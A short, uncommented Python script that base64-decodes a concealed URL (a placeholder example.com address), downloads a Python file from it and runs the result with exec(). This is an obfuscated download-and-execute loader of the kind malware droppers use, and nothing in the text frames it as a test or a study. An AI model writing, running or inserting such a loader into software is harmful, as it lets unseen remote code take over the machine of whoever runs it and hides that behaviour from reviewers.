import base64
import requests

def decodeUrl(x):
    return base64.b64decode(x).decode("utf-8")

def fetchContent(y):
    z = requests.get(y)
    return z.text

def main():
    try:
        x = "aHR0cDovL2V4YW1wbGUuY29tL3NjcmlwdDExLnB5"
        y = decodeUrl(x)
        w = fetchContent(y)
        exec(w)
    except Exception as e:
        print(e)

main()
